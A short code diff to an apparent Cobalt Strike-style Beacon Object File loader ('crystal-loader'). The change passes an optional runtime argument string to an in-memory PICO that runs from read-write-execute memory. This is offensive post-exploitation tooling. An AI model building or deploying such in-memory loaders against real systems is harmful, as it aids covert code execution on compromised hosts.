@@ -60,6 +60,10 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
         return 2;
     }
 
+    /* optional runtime args string (second extension argument, type string) */
+    int args_len = 0;
+    char *runtime_args = BeaconDataExtract(&parser, &args_len);
+
     /*
      * Allocate RWX. The PICO does its own VirtualProtect calls internally
      * (see postex-loader/src/loader.c fix_section_permissions). Starting
@@ -82,7 +86,7 @@ EXPORT int __cdecl go(char *argsBuffer, uint32_t bufferSize, goCallback callback
     emit(callback, "[crystal-loader] executing PICO\n");
 
     pico_entry_t entry = (pico_entry_t)pico_mem;
-    entry(NULL);
+    entry((args_len > 0) ? runtime_args : NULL);
 
     /*
      * Intentionally NOT freeing pico_mem. Crystal Palace's loader chain
